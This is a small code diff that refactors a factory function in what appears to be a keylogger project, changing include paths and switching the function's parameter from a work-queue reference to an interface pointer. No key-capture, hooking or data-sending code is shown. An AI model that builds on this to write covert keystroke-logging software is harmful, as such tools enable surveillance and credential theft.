@@ -1,7 +1,7 @@
-#include				"keylogger_dll\KeyloggerDLL.h"
-#include "WorkQueue.h"
+#include "KeyloggerDLL.h"
+#include "workQueueManager.h"
 
-IKeylogger*				instantiate(WorkQueue &item)
+IKeylogger*				instantiate(IWorkQueue *item)
 {
 	IKeylogger			*keylogger = new Keylogger(item);
 	return keylogger;
